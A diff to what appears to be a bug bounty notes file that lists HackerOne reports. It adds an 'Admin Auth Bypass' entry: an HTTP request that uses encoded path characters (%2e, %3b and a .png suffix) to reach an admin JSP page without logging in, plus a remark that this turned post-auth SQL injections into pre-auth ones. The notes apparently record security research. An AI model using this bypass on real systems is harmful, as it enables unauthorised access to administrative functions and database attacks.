@@ -10,3 +10,8 @@
 - https://hackerone.com/reports/824689
 - https://hackerone.com/reports/831962
 
+## Admin Auth Bypass
+```http
+GET /admin%2ejsp%3b.png
+```
+Was able to turn a number of post-auth SQL injections into pre-auth vulns.
